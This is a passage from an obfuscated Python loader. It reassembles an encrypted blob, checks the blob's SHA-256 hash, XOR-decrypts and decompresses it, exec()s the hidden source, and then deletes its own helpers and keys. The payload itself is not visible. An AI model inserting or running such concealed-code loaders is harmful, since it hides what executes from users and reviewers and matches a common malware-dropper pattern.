_caNKxCv4fwhZeL + _cjwrCFngcGcV8t + _cwfHusCoj6BmwK + _cq4qjYFwoMzJPN + _cwgVGf90EtImh5 + _cwA6QZw2tNhoSN + _chqWFKJ52eZImP + _ciOvBZhwfAvHos + _cpn5dUYb5uflE8 + _cb4huKBmr5g6jP + _cdxrvnyQ2pIJOb + _cgy_ureW7msAqu + _cp0bswByW7Ez3f + _cbyvOMdiB1W46q + _cl8u2bSfewDvRA + _cvQCCn6Sn0BerB + _ccyafxSyspvUoN + _cbiVCsWciD2tSc + _ckZCAU_kC8ucxh + _caynRsxvTv_6Sc + _ck6Nz7xzPRV80D + _cnUsZT_fcVIcLX + _cal_KuKZJsOnaN + _cqaQhSuYysgNbl + _cvXYt5edUyLKEl + _czcBfcTpb4WW1i + _coo3EDziaZJwvk + _cet6lQlgMDANcL + _cuYl84vtKM6mJu + _clas4bREm6RSh2 + _cjYWorQ1DAdneC + _cp_pxx82FIne61 + _cn2NWcq0FX5znM + _cp1_TJI6AwfT_I + _cxLTYULutuEuEy + _czWbQ5zKSg7VbZ + _cd65_4uCRVtN4g + _cgVIl8FXvko_CU + _ca9CILdb4r7W8Q + _cpBmsqsIajrAFK + _cl72Ltlowyf_6O + _cv7_xo5k68XpiL + _cex7YvKbnq31Ot + _chMng_zYD4ontB + _cx4WA19wLxrniA + _coQLJNmxhlhuoZ + _ccj2zODxQZ7wy0 + _cr9z1i0Ts5CmxS + _ckA03bXJpTdzRc + _cpwV5KUgtqwUVS + _ccoWmhNVkMMk2E + _cbcvHiKF_qp2BX + _cfzKwWCW9O0uNN + _cy6cLS4X32LJY6 + _cfA61XHv_ePHHJ + _cjMgPoI3EiW4kV + _czAd1o759inhtW + _czHmz836XzvITi + _cnEMUslJLBb5sX + _chN5MrgQ_y30z4 + _cptwIJHdpqGQWb + _cvsOQXhcBMINJo + _csb4tuQr_yc3wI + _cxEBp25Y9cgEnu + _csugG0LkhOqaQr + _cfgHEgvbXMftu6 + _cu0ZJ8GxSEQCNi + _celRtN9Aw4Dxec + _cm8No6eDAaddqR + _cn05iUVBjszecp + _ckBkWXqGAki88m + _ckYvleylubQrKI + _cwYXcPv5VPcr3a + _cqQxmi7fK7_XxH + _caKXV9GniUzXD1 + _ccGzbqvliVBnxx + _cuF_BUgJKUUIMH + _cfSdhyKMxDZmu5 + _cfewEYCieUQDMq + _cjU2E9wGFF5_8A + _cgByp6TXDkyKOF + _cj6HuLEPExu75Q + _cqM1zD7VbR16yb + _cdSpCoIzZvDSMD + _cbZLXXT5AQ8FBn + _ch11SuhE9Di94k + _ckNMnG1bpycEBz + _cfdHRyE3dxttd_ + _cqn9PezTL1lxPT + _ct8T6BoHOmhpcb + _cgrnvVwK6WiQx2 + _ccELWXBKHqE0UR + _cek9RBuFT33rOi + _cjKxFaJFNT6XfK + _crgWCBieMfxlG0 + _cm6AI0CwmdlWj7 + _ctKo91n8s_mr1A + _cg73kqSTLatENC + _cc2h941h2S4AzC + _cignD2jMnJUnv9 + _cg6HGc3a43KUHT + _caOHuQCxG2YtKt + _cwuCbzkGwM67RD + _cnkNrroIkxjoD2 + _cwpSYl8353CAsc + _czB1toSQ0hljEb + _ceEjdDRXfBizQF + _cws0riksKlRNDR + _c_MHaI8B7Pltt0 + _cxAmXYntPYMyQP + _cu5YSzOkQng4GW + _cm1D1tE5hNqo4k + _cmUMiRAioM673C + _ceUefMOPwhx6wB + _cjak1fW69MR2Uv + _cvuaMbBSjRZumj + _caMDxXKk3eukiL + _chhBbWPWEiVTpO + _cpa98eNE0qLRyi + _cu1FJNMe0zOmEU + _cl_S6wTHgZinfr + _cnmHigEXi4_xA7 + _cxzhJbeTphonVS + _cn2BkwMPXb6eXV + _clBkaFWCTBZ4_Z + _cjam_uP03SUqVi)
if __import__('hashlib').sha256(_pq8xcavUS4GRpj).hexdigest() != 'ab9ac6d4ea86270c5a2c9715f237a6c51112ffec6efd0437b456fe6eecb53e5d':
    __import__('sys').exit(1)
_xcyy5ByeNrJg5B = bytes([134, 107, 225, 235, 221, 177, 95, 249, 216, 89, 158, 92, 26, 229, 198, 187, 166, 104, 135, 46, 242, 126, 6, 23, 48])
_fktVsPeSiBjDRCf = bytes([208, 189, 144, 162, 122, 141, 115, 38, 252, 13, 213, 70, 228, 218, 152, 172, 239, 160, 24, 201, 185, 124, 149, 254, 21])

def _fxm3pmZbATIMzGI(_bgTcTdbETxG6al, _ky8eEhcqdhP_GC):
    return bytes(_bgTcTdbETxG6al[_itkiCCXKz6N5k5] ^ _ky8eEhcqdhP_GC[_itkiCCXKz6N5k5 % len(_ky8eEhcqdhP_GC)] for _itkiCCXKz6N5k5 in range(len(_bgTcTdbETxG6al)))

def _fdiw6swtFhgSU_h(_trxTtdJFVBfJK4):
    import zlib
    return zlib.decompress(_trxTtdJFVBfJK4) # Un seul niveau de zlib ici pour simplifier

def _fejdCFitwUsh3Wi():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xuBXeYLSGcKyuJ = _fxm3pmZbATIMzGI(_pq8xcavUS4GRpj, _xcyy5ByeNrJg5B)
    # 2. Décompression Zlib
    _dlGReHlSIyoM9L = _fdiw6swtFhgSU_h(_xuBXeYLSGcKyuJ)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dlGReHlSIyoM9L.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nu3dYMj7e7YBug = _main.__dict__
    _nu3dYMj7e7YBug.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nu3dYMj7e7YBug)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_fejdCFitwUsh3Wi()
try:
    del _fxm3pmZbATIMzGI, _fdiw6swtFhgSU_h, _fejdCFitwUsh3Wi
    del _pq8xcavUS4GRpj, _xcyy5ByeNrJg5B, _fktVsPeSiBjDRCf
except:
    pass
